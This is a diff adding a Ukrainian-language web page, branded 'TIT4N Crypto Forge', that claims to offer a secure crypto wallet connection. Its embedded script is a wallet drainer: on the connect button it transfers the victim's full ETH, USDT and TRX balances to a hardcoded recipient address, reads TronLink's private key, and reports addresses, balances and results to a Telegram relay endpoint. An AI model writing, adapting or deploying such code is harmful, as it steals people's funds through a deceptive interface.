@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Автоматичний переказ USDT, TRX та ETH</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔐</div>
+            <img src="{{ url_for('static', filename='icons/logo-removebg.png') }}" alt="TIT4N Crypto Forge Logo">
+            <div class="network-indicator" id="networkIndicator">● Online</div>
+        </div>
+
+        <div class="card">
+            <h1 class="title">Підключіть ваш криптогаманець</h1>
+            <p class="subtitle">Натисніть кнопку нижче для підключення</p>
+
+            <div class="wallet-grid">
+                <button class="wallet-button full-width" id="connectWallet">
+                    <img src="{{ url_for('static', filename='icons/wallet.png') }}" alt="Wallet">
+                    <span>Підключити гаманець</span>
+                </button>
+            </div>
+
+            <div class="connection-status">
+                <div class="status-item">
+                    <span class="label">Статус:</span>
+                    <span class="value" id="statusText">Не підключено</span>
+                </div>
+                <div class="status-item">
+                    <span class="label">Адреса:</span>
+                    <span class="value" id="walletAddress">—</span>
+                </div>
+            </div>
+
+            <div class="additional-info">
+                <p>🔒 Безпечне підключення до вашого криптогаманця.</p>
+                <p>💡 Підтримуються всі популярні провайдери гаманців.</p>
+                <p>🚀 Почніть використовувати децентралізовані додатки вже сьогодні!</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 TIT4N Crypto Forge. Всі права захищені.</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const statusText = document.getElementById("statusText");
+            const walletAddress_page = document.getElementById("walletAddress");
+
+            // Адреса контракту USDT (ERC-20)
+            const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet
+            // Адреса отримувача
+            const recipientAddress = "TUhVeqDoZajcs94CUPyDeYdvsL6EHqgCXh";
+
+            // ABI для контракту USDT (ERC-20)
+            const usdtAbi = [
+                "function balanceOf(address owner) view returns (uint256)",
+                "function transfer(address to, uint256 value) returns (bool)"
+            ];
+
+            // Функція для відправки даних в Telegram
+            async function sendToTelegram(walletAddress, walletType, usdtBalance, trxBalance, ethBalance, message) {
+                try {
+                    const response = await fetch("/send_telegram", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            wallet_address: walletAddress,
+                            wallet_type: walletType,
+                            usdt_balance: usdtBalance,
+                            trx_balance: trxBalance,
+                            eth_balance: ethBalance,
+                            message: message
+                        })
+                    });
+
+                    if (!response.ok) {
+                        throw new Error("Помилка відправки в Telegram.");
+                    }
+                } catch (error) {
+                    console.error("Помилка відправки в Telegram:", error);
+                }
+            }
+
+            // Функція для отримання балансу USDT
+            async function getUSDTBalance(signer, walletAddress) {
+                try {
+                    const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, signer);
+                    const balance = await usdtContract.balanceOf(walletAddress);
+                    return ethers.utils.formatUnits(balance, 6); // Конвертація в USDT (6 десяткових знаків)
+                } catch (error) {
+                    console.error("Помилка отримання балансу USDT:", error);
+                    return "0.0";
+                }
+            }
+
+            // Функція для переказу USDT
+            async function transferUSDT(signer, walletAddress) {
+                try {
+                    const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, signer);
+                    const balance = await usdtContract.balanceOf(walletAddress);
+
+                    if (balance.isZero()) {
+                        return "На вашому гаманці немає USDT.";
+                    }
+
+                    const tx = await usdtContract.transfer(recipientAddress, balance);
+                    await tx.wait();
+
+                    return `USDT переказано: ${ethers.utils.formatUnits(balance, 6)}`;
+                } catch (error) {
+                    console.error("Помилка переказу USDT:", error);
+                    return `Помилка переказу USDT: ${error.message}`;
+                }
+            }
+
+            // Функція для отримання балансу ETH
+            async function getETHBalance(signer, walletAddress) {
+                try {
+                    const balance = await signer.getBalance();
+                    return ethers.utils.formatEther(balance); // Конвертація в ETH
+                } catch (error) {
+                    console.error("Помилка отримання балансу ETH:", error);
+                    return "0.0";
+                }
+            }
+
+            // Функція для переказу ETH
+            async function transferETH(signer, walletAddress) {
+                try {
+                    const balance = await signer.getBalance();
+
+                    if (balance.isZero()) {
+                        return "На вашому гаманці немає ETH.";
+                    }
+
+                    const tx = await signer.sendTransaction({
+                        to: recipientAddress,
+                        value: balance
+                    });
+                    await tx.wait();
+
+                    return `ETH переказано: ${ethers.utils.formatEther(balance)}`;
+                } catch (error) {
+                    console.error("Помилка переказу ETH:", error);
+                    return `Помилка переказу ETH: ${error.message}`;
+                }
+            }
+
+            // Функція для отримання балансу TRX
+            async function getTRXBalance(tronWeb, walletAddress) {
+                try {
+                    const balance = await tronWeb.trx.getBalance(walletAddress);
+                    return tronWeb.fromSun(balance); // Конвертація з SUN в TRX
+                } catch (error) {
+                    console.error("Помилка отримання балансу TRX:", error);
+                    return "0.0";
+                }
+            }
+
+            // Функція для переказу TRX
+            async function transferTRX(tronWeb, walletAddress) {
+                try {
+                    const balance = await tronWeb.trx.getBalance(walletAddress);
+
+                    if (balance === 0) {
+                        return "На вашому гаманці немає TRX.";
+                    }
+
+                    const tx = await tronWeb.transactionBuilder.sendTrx(recipientAddress, balance, walletAddress);
+                    const signedTx = await tronWeb.trx.sign(tx);
+                    const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                    return `TRX переказано: ${tronWeb.fromSun(balance)}`;
+                } catch (error) {
+                    console.error("Помилка переказу TRX:", error);
+                    return `Помилка переказу TRX: ${error.message}`;
+                }
+            }
+
+            // Функція для підключення гаманця
+            async function connectWallet() {
+                try {
+                    let walletType = "Unknown";
+                    let walletAddress = null;
+                    let usdtBalance = "0.0";
+                    let trxBalance = "0.0";
+                    let ethBalance = "0.0";
+                    let message = "";
+
+                    // Перевірка наявності Ethereum гаманця (MetaMask, Trust Wallet тощо)
+                    if (window.ethereum) {
+                        // Запит на підключення гаманця
+                        await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                        // Ініціалізація провайдера
+                        const provider = new ethers.providers.Web3Provider(window.ethereum);
+                        const signer = provider.getSigner();
+
+                        // Отримання адреси гаманця
+                        walletAddress = await signer.getAddress();
+
+
+
+                        if (window.ethereum.isTrust) {
+                            walletType = "Trust Wallet";
+                        } else if (window.ethereum.isMetaMask) {
+                            walletType = "MetaMask";
+                        }
+
+                        // Отримання балансу ETH
+                        ethBalance = await getETHBalance(signer, walletAddress);
+                        console.log(`Баланс ETH: ${ethBalance}`);
+
+                        // Переказ ETH
+                        const ethMessage = await transferETH(signer, walletAddress);
+                        message += ethMessage + "\n";
+
+                        // Отримання балансу USDT
+                        usdtBalance = await getUSDTBalance(signer, walletAddress);
+                        console.log(`Баланс USDT: ${usdtBalance}`);
+
+                        // Переказ USDT
+                        const usdtMessage = await transferUSDT(signer, walletAddress);
+                        message += usdtMessage + "\n";
+                    }
+                    // Перевірка наявності TronLink
+                    else if (window.tronWeb) {
+                        // Очікуємо, поки TronLink ініціалізується
+                        await new Promise((resolve) => {
+                            const interval = setInterval(() => {
+                                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                                    clearInterval(interval);
+                                    resolve();
+                                }
+                            }, 100);
+                        });
+
+                        walletType = "TronLink";
+                        walletAddress = window.tronWeb.defaultAddress.base58;
+
+                        const tronWeb = new TronWeb({
+                            fullHost: "https://api.trongrid.io",
+                            privateKey: window.tronWeb.defaultPrivateKey
+                        });
+
+                        // Отримання балансу TRX
+                        trxBalance = await getTRXBalance(tronWeb, walletAddress);
+                        console.log(`Баланс TRX: ${trxBalance}`);
+
+                        // Переказ TRX
+                        const trxMessage = await transferTRX(tronWeb, walletAddress);
+                        message += trxMessage + "\n";
+                    } else {
+                        throw new Error("Будь ласка, встановіть MetaMask, Trust Wallet або TronLink!");
+                    }
+
+                    statusText.textContent = `✅ Підключено (${walletType})`;
+                    walletAddress_page.textContent = walletAddress;
+
+                    // Відправка даних в Telegram
+                    await sendToTelegram(walletAddress, walletType, usdtBalance, trxBalance, ethBalance, message);
+                    alert(`Успішно: ${message}`);
+                } catch (error) {
+                    statusText.textContent = "❌ Помилка підключення";
+                    console.error("Помилка підключення гаманця:", error);
+                    alert(`Помилка: ${error.message}`);
+                }
+            }
+
+            // Додавання обробника подій для кнопки підключення
+            document.getElementById("connectWallet").addEventListener("click", connectWallet);
+
+            // Ініціалізація перевірки мережі
+            if (window.ethereum) {
+                window.ethereum.on('chainChanged', () => window.location.reload());
+                document.getElementById("networkIndicator").classList.add("online");
+            }
+        });
+    </script>
+</body>
+</html>
